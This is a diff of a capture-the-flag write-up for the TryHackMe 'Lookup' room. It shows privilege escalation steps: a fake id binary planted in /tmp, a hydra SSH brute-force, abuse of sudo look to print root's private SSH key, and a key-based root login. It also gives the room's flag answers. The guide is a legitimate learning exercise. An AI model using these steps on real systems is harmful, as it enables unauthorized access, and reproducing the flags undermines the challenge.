@@ -287,11 +287,12 @@ and..
 echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /tmp/id
 ```
 
-let's run the `usr/sbin/pwm` again..
+let's run the `/usr/sbin/pwm` again..
 
-![Screenshot](/assets/img/Lookup/Screenshot%202024-11-30%20094645.png)
+![Screenshot](/assets/img/Lookup/recovery.png)
 
-what we got here looks like a password list, so let's save it in a file and let's try to bruteforce the user think.
+
+what we got here a password list, so let's save it in a file and let's try to bruteforce the user think.
 
 there is the password list:
 
@@ -347,23 +348,26 @@ jose.9298
 jose.2856171
 ```
 
-Now we can login via ssh protocol with the password.
+let's save it and brute force the think user.
 
 ```bash
-$id
-uid=1000(think) gid=1000(think) groups=1000(think)
+hydra -l think -P passwords.txt ssh://10.10.55.65
 ```
-now we need to privilege our escalation for the last time:
 
-```bash
-$sudo -l
-[Sudo] password for think:
-Matching Defaults entries for think on lookup:
-env_reset, mial_badpass, secure_path=/usr/local/sbin\:/usr/local/bin|:/usr/local/bin
+![Screenshot](/assets/img/Lookup/recovery%202.png)
 
-User think may urn the following commands on lookup:
-(ALL) /usr/bin/look
-```
+let's login using this credinitial then:
+
+![Screenshot](/assets/img/Lookup/recovery%203.png)
+
+let's use these two commands to know our user id and which command we are able to use:
+
+`id`: Displays user ID (UID), group ID (GID), and other group memberships.
+
+`sudo -l`: Lists the commands the current user can run with sudo without needing a password.
+
+![Screenshot](/assets/img/Lookup/recovery%204.png)
+
 
 to exploit this stage we need to search for what should we do next..
 `https://gtfobins.github.io/`
@@ -371,16 +375,81 @@ to exploit this stage we need to search for what should we do next..
 
 ![Screenshot](/assets/img/Lookup/17.png)
 
-As per GTFOBins, this binary allows us to read files on the system. Since we have root privileges, we can access any file on the system!
+```bash
+LFILE=/root/.ssh/id_rsa
 
-root’s private SSH key:
+sudo look '' "$LFILE"
+```
 
-![Screenshot](/assets/img/Lookup/18.png)
+```c
+**Command Explanation:**
+
+LFILE=/root/.ssh/id_rsa: Sets a variable LFILE with the path to the private SSH key.
+
+sudo look '' "$LFILE":
+
+look: A command that searches for lines in a file that match a given prefix.
+sudo look '' "$LFILE": Uses sudo to run look with an empty prefix (''), effectively printing the contents of the file ($LFILE).
+Purpose:
+This command displays the contents of /root/.ssh/id_rsa (the root user’s private SSH key), potentially allowing unauthorized access if permissions are misconfigured.
+```
+
+![Screenshot](/assets/img/Lookup/recovery%205.png)
 
 
-We can store the key in a file on our Kali machine and then use it to log in as root.
+let's save the key in a file on our Kali machine:
 
-![Screenshot](/assets/img/Lookup/19.png)
+![Screenshot](/assets/img/Lookup/recovery%206.png)
+
+when you save the id_rsa content don't forget to save it as it was without any empty spaces and should starts with:
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+
+and ends with 
+
+-----END OPENSSH PRIVATE KEY-----
+
+let's Adjust file permissions to secure the private key using this command:
+
+```bash
+chmod 600 id_rsa
+```
+
+and then login as a root!
+
+```bash
+ssh -i id_rsa rrot@lookup.thm
+```
+![Screenshot](/assets/img/Lookup/recovery%207.png)
+
+**Breakdown of the Command:**
+
+`-i id_rsa`: Specifies the private key file to use for authentication.
+
+`root`: The username to log in with.
+
+`lookup.thm`: The target IP address.
 
 
-We Finaly got the root!
+let's solve the thm questions:
+
+**What is the user flag?**
+
+*38375fb4dd8baa2b2039ac03d92b820e*
+
+before we login as a root I got the user.txt flag `:)`
+
+![Screenshot](/assets/img/Lookup/ans%201.png)
+
+
+**What is the root flag?**
+
+*5a285a9f257e45c68bb6c9f9f57d18e8*
+
+![Screenshot](/assets/img/Lookup/ans%202.png)
+
+and yea we did it..
+
+![Screenshot](/assets/img/Lookup/congrats.png)
+
+See you in the Next CTF Bro `:)`
